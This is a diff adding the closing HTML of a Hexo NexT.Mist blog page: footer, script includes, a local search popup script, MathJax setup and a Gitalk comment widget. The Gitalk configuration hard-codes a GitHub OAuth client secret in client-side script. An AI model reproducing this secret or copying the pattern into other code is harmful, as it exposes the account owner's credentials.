+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '0b99d1afde2409a546f0',
+          clientSecret: '211820c84d1158586d2bd6b11d0ee21d0b1ac50d',
+          repo: 'xinyongpeng.github.io',
+          owner: 'xinyongpeng',
+          admin: ['xinyongpeng'],
+          id: location.pathname,
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.staticfile.org/MathJax/MathJax-2.6-latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
